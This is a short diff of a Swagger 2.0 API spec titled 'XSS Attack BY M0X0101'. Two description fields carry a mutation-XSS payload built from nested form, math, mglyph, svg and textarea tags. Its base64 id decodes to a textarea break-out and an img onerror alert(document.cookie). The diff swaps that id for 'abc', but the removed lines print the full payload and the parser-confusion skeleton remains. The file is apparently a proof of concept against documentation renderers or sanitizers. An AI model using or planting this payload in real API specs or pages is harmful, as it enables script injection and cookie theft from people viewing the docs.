@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="PC90ZXh0YXJlYT48aW1nIG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9MT4="></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="abc"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -27,7 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="PC90ZXh0YXJlYT48aW1nIG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuY29va2llKSBzcmM9MT4="></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="abc"></form>
           format: int64
           in: path
           name: id
